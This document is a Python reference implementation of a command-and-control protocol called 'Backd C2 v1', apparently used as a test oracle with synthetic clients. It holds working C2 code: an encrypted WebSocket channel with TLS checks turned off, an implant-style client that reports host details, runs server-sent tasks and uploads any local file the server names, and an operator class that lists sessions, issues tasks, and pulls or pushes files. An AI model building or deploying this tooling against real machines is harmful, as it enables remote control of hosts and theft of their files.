"""Reference implementation of the Backd C2 v1 wire protocol (Python).

Used as the test oracle / synthetic client fleet. Mirrors:
  - 24-byte frame header, AES-128-GCM payload with header as AAD
  - TLV payload encoding
  - HELLO cleartext + HMAC proof, per-connection HKDF key
  - WebSocket client (RFC6455, masked frames)
"""
import base64
import hashlib
import hmac
import os
import socket
import ssl
import struct
import time

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

MAGIC = b"BDC2"
VER = 1
HDR = 24

T_HELLO = 1
T_HELLO_ACK = 2
T_TASK = 3
T_TASK_RESULT = 4
T_FILE_META = 5
T_FILE_CHUNK = 6
T_FILE_ACK = 7
T_PING = 8
T_PONG = 9
T_AUTH = 10
T_AUTH_OK = 11
T_NOTICE = 12
T_ERROR = 13

T_OP_LIST = 20
T_OP_LIST_RESULT = 21
T_OP_TASK = 22
T_OP_RESULT = 23
T_OP_FILE_PUSH = 24
T_OP_FILE_PULL = 25
T_OP_FILE_FETCH = 26
T_OP_FILE_CHUNK = 27
T_OP_FILE_DONE = 28
T_OP_KILL = 29

D_C2S, D_S2C, D_O2S, D_S2O = 1, 2, 3, 4


def hkdf(ikm: bytes, salt: bytes, info: bytes, n: int) -> bytes:
    prk = hmac.new(salt or b"\x00" * 32, ikm, hashlib.sha256).digest()
    out, t, i = b"", b"", 1
    while len(out) < n:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        out += t
        i += 1
    return out[:n]


def hello_key(psk: bytes, client_id: bytes, nonce: bytes) -> bytes:
    return hkdf(psk, client_id + nonce, b"backd-c2-v1", 16)


def operator_key(psk: bytes, user: str) -> bytes:
    return hkdf(psk, b"op:" + user.encode(), b"backd-c2-v1", 16)


def hello_mac(psk: bytes, client_id: bytes, nonce: bytes) -> bytes:
    return hmac.new(psk, b"hello" + client_id + nonce, hashlib.sha256).digest()


def op_mac(psk: bytes, user: str, nonce: bytes) -> bytes:
    return hmac.new(psk, b"opauth" + user.encode() + nonce, hashlib.sha256).digest()


def tlv(pairs) -> bytes:
    out = b""
    for k, v in pairs:
        kb = k.encode() if isinstance(k, str) else k
        vb = v.encode() if isinstance(v, str) else v
        out += bytes([len(kb)]) + kb + struct.pack(">I", len(vb)) + vb
    return out


def untlv(b: bytes) -> dict:
    m = {}
    while b:
        kl = b[0]
        b = b[1:]
        k = b[:kl].decode()
        b = b[kl:]
        vl = struct.unpack(">I", b[:4])[0]
        b = b[4:]
        m[k] = b[:vl]
        b = b[vl:]
    return m


def seal(key: bytes, typ: int, flags: int, sid: int, seq: int, direction: int, payload: bytes) -> bytes:
    hdr = bytearray(HDR)
    hdr[0:4] = MAGIC
    hdr[4] = VER
    hdr[5] = typ
    hdr[6] = flags
    struct.pack_into(">Q", hdr, 8, sid)
    struct.pack_into(">I", hdr, 16, seq)
    if flags & 1:
        struct.pack_into(">I", hdr, 20, len(payload))
        return bytes(hdr) + payload
    # payload length must be part of the AAD, so seal() knows it up-front:
    # GCM ciphertext length == plaintext length, tag adds 16 bytes.
    struct.pack_into(">I", hdr, 20, len(payload) + 16)
    nonce = bytes([direction]) + b"\x00" * 7 + struct.pack(">I", seq)
    ct = AESGCM(key).encrypt(nonce, payload, bytes(hdr))
    assert len(ct) == len(payload) + 16
    return bytes(hdr) + ct

def open_frame(key, frame, direction):
    if frame[:4] != MAGIC or frame[4] != VER:
        raise ValueError("bad frame")
    typ, flags = frame[5], frame[6]
    sid = struct.unpack(">Q", frame[8:16])[0]
    seq = struct.unpack(">I", frame[16:20])[0]
    plen = struct.unpack(">I", frame[20:24])[0]
    body = frame[HDR:]
    if len(body) != plen:
        raise ValueError("length mismatch")
    if flags & 1:
        return typ, flags, sid, seq, body
    nonce = bytes([direction]) + b"\x00" * 7 + struct.pack(">I", seq)
    pt = AESGCM(key).decrypt(nonce, body, frame[:HDR])
    return typ, flags, sid, seq, pt


class WSSock:
    def __init__(self, sock: socket.socket, buf=b""):
        self.s = sock
        self.buf = buf

    @classmethod
    def connect(cls, host, port, path="/ws", timeout=10, tls=False, sni=None):
        s = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=sni or host)
        key = base64.b64encode(os.urandom(16)).decode()
        req = (f"GET {path} HTTP/1.1\r\nHost: {sni or host}:{port}\r\n"
               f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
               f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
        s.sendall(req)
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                raise ConnectionError("handshake eof")
            data += chunk
        head, rest = data.split(b"\r\n\r\n", 1)
        if b" 101 " not in head.split(b"\r\n")[0]:
            raise ConnectionError("bad handshake: " + head.split(b"\r\n")[0].decode(errors="replace"))
        return cls(s, rest)

    def send(self, op, payload):
        mask = os.urandom(4)
        hdr = bytearray([0x80 | op])
        n = len(payload)
        if n < 126:
            hdr.append(0x80 | n)
        elif n <= 0xFFFF:
            hdr.append(0x80 | 126)
            hdr += struct.pack(">H", n)
        else:
            hdr.append(0x80 | 127)
            hdr += struct.pack(">Q", n)
        hdr += mask
        body = bytes(b ^ mask[i & 3] for i, b in enumerate(payload))
        self.s.sendall(bytes(hdr) + body)

    def _recv_exact(self, n):
        while len(self.buf) < n:
            chunk = self.s.recv(65536)
            if not chunk:
                raise ConnectionError("eof")
            self.buf += chunk
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def recv_msg(self):
        while True:
            h = self._recv_exact(2)
            fin = h[0] & 0x80
            op = h[0] & 0xF
            n = h[1] & 0x7F
            if n == 126:
                n = struct.unpack(">H", self._recv_exact(2))[0]
            elif n == 127:
                n = struct.unpack(">Q", self._recv_exact(8))[0]
            mask = self._recv_exact(4) if h[1] & 0x80 else None
            payload = self._recv_exact(n) if n else b""
            if mask:
                payload = bytes(b ^ mask[i & 3] for i, b in enumerate(payload))
            if op == 0x8:
                raise ConnectionError("close")
            if op == 0x9:
                self.send(0xA, payload)
                continue
            if op == 0xA:
                continue
            return payload

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


class ClientConn:
    """Synthetic C2 client speaking v1."""

    def __init__(self, host, port, client_id, psk, os_name="windows", arch="x86_64", ver="mvp-py",
                 tls=False, sni=None):
        self.host, self.port, self.client_id, self.psk = host, port, client_id, psk
        self.os, self.arch, self.ver = os_name, arch, ver
        self.tls, self.sni = tls, sni
        self.ws = None
        self.key = None
        self.sid = 0
        self.send_seq = 0
        self.recv_seq = 0
        self.heartbeat = 5
        self.handlers = {}

    def connect(self):
        self.ws = WSSock.connect(self.host, self.port, "/ws", tls=self.tls, sni=self.sni)
        nonce = os.urandom(16)
        payload = tlv([
            ("id", self.client_id), ("os", self.os), ("arch", self.arch),
            ("ver", self.ver), ("pid", str(os.getpid())), ("nonce", nonce),
            ("mac", hello_mac(self.psk, self.client_id.encode(), nonce)),
        ])
        self.ws.send(2, seal(None, T_HELLO, 1, 0, 0, D_C2S, payload))
        raw = self.ws.recv_msg()
        if raw[:4] != MAGIC:
            raise ConnectionError("bad hello ack")
        self.key = hello_key(self.psk, self.client_id.encode(), nonce)
        typ, flags, sid, seq, body = open_frame(self.key, raw, D_S2C)
        if typ == T_ERROR:
            raise ConnectionError("server error " + str(untlv(body)))
        if typ != T_HELLO_ACK:
            raise ConnectionError("unexpected hello reply type %d" % typ)
        self.sid = sid
        self.recv_seq = seq
        kv = untlv(body)
        self.heartbeat = int(kv.get("heartbeat", b"5"))
        return self

    def send_frame(self, typ, pairs):
        self.send_seq += 1
        self.ws.send(2, seal(self.key, typ, 0, self.sid, self.send_seq, D_C2S, tlv(pairs)))

    def recv_frame(self, timeout=10):
        self.ws.s.settimeout(timeout)
        data = self.ws.recv_msg()
        typ, _, sid, seq, body = open_frame(self.key, data, D_S2C)
        if seq <= self.recv_seq:
            raise ValueError("replay seq")
        self.recv_seq = seq
        return typ, untlv(body)

    def ping(self):
        t = str(time.time()).encode()
        self.send_frame(T_PING, [("t", t)])
        typ, kv = self.recv_frame()
        return typ == T_PONG, kv.get("t")

    def run_once(self, timeout=5):
        """Read one frame and service it. Returns type handled."""
        typ, kv = self.recv_frame(timeout)
        self.handle(typ, kv)
        return typ

    def handle(self, typ, kv):
        if typ == T_PING:
            self.send_frame(T_PONG, [("t", kv.get("t", b""))])
        elif typ == T_TASK:
            self.handle_task(kv)
        elif typ == T_FILE_META:
            d = kv.get("dir", b"")
            if d == b"to_server":
                path = kv["file"].decode()
                xid = kv["xfer"].decode()
                data = open(path, "rb").read()
                chunk = 48 * 1024
                for off in range(0, len(data), chunk):
                    end = min(off + chunk, len(data))
                    self.send_frame(T_FILE_CHUNK, [("xfer", xid), ("off", str(off)),
                                                   ("data", data[off:end]),
                                                   ("final", "1" if end == len(data) else "")])
            elif d == b"to_client":
                self._incoming = {"file": kv["file"].decode(), "size": int(kv.get("size", b"0")),
                                  "sha": kv.get("sha", b"").decode(), "buf": bytearray()}
        elif typ == T_FILE_CHUNK:
            inc = getattr(self, "_incoming", None)
            if inc is not None:
                inc["buf"] += kv.get("data", b"")
                if kv.get("final", b"") == b"1":
                    os.makedirs(os.path.dirname(inc["file"]) or ".", exist_ok=True)
                    with open(inc["file"], "wb") as f:
                        f.write(inc["buf"])
                    self.send_frame(T_FILE_ACK, [("xfer", kv["xfer"]), ("status", "ok"),
                                                 ("sha", hashlib.sha256(inc["buf"]).hexdigest())])
                    self._incoming = None
        elif typ == T_NOTICE:
            pass

    def handle_task(self, kv):
        task = kv.get("task", b"").decode()
        kind = kv.get("kind", b"").decode()
        args = kv.get("args", b"")
        try:
            if kind == "echo":
                out = args
                status = "ok"
            elif kind == "sysinfo":
                out = (f"{self.client_id}|{self.os}|{self.arch}|{self.ver}").encode()
                status = "ok"
            elif kind == "sleep":
                time.sleep(min(float(args or b"1"), 10))
                out = b"slept"
                status = "ok"
            elif kind == "file_get":
                raise RuntimeError("file_get is driven by FILE_META, not TASK")
            else:
                out, status = b"", "unsupported"
        except Exception as e:  # noqa: BLE001
            out, status = b"", "error"
            self.send_frame(T_TASK_RESULT, [("task", task), ("status", status), ("err", str(e))])
            return
        self.send_frame(T_TASK_RESULT, [("task", task), ("status", status), ("out", out)])

    def close(self):
        if self.ws:
            self.ws.close()


class OperatorConn:
    def __init__(self, host, port, user, psk, tls=False, sni=None):
        self.host, self.port, self.user, self.psk = host, port, user, psk
        self.tls, self.sni = tls, sni

    def connect(self):
        self.ws = WSSock.connect(self.host, self.port, "/ws", tls=self.tls, sni=self.sni)
        nonce = os.urandom(16)
        self.ws.send(2, seal(None, T_AUTH, 1, 0, 0, D_O2S, tlv([
            ("user", self.user), ("nonce", nonce),
            ("mac", op_mac(self.psk, self.user, nonce)),
        ])))
        self.key = operator_key(self.psk, self.user)
        typ, _, _, seq, body = open_frame(self.key, self.ws.recv_msg(), D_S2O)
        if typ != T_AUTH_OK:
            raise ConnectionError("auth failed")
        self.recv_seq = seq
        self.send_seq = 0
        return self

    def send(self, typ, pairs):
        self.send_seq += 1
        self.ws.send(2, seal(self.key, typ, 0, 0, self.send_seq, D_O2S, tlv(pairs)))

    def recv(self, timeout=30):
        self.ws.s.settimeout(timeout)
        data = self.ws.recv_msg()
        typ, _, _, seq, body = open_frame(self.key, data, D_S2O)
        if seq <= self.recv_seq:
            raise ValueError("replay")
        self.recv_seq = seq
        return typ, untlv(body)

    def list(self):
        self.send(T_OP_LIST, [])
        typ, kv = self.recv()
        import json
        return json.loads(kv["sessions"])

    def task(self, sid, kind, args=b"", timeout=20):
        self.send(T_OP_TASK, [("session", str(sid)), ("kind", kind), ("args", args),
                              ("timeout", str(timeout))])
        typ, kv = self.recv(timeout + 10)
        return typ, kv

    def pull(self, sid, remote, timeout=60):
        self.send(T_OP_FILE_PULL, [("session", str(sid)), ("file", remote)])
        return self.recv(timeout + 10)

    def fetch_stream(self, xfer, out_path, timeout=60):
        self.send(T_OP_FILE_FETCH, [("xfer", xfer)])
        buf = b""
        while True:
            typ, kv = self.recv(timeout)
            if typ == T_OP_FILE_CHUNK:
                buf += kv["data"]
            elif typ == T_OP_FILE_DONE:
                with open(out_path, "wb") as f:
                    f.write(buf)
                return len(buf), kv.get("sha", b"").decode()
            elif typ == T_ERROR:
                raise ConnectionError(kv.get("msg", b"").decode())

    def push(self, sid, remote, data):
        self.send(T_OP_FILE_PUSH, [("session", str(sid)), ("file", remote), ("data", data)])
        return self.recv(60)

    def close(self):
        self.ws.close()
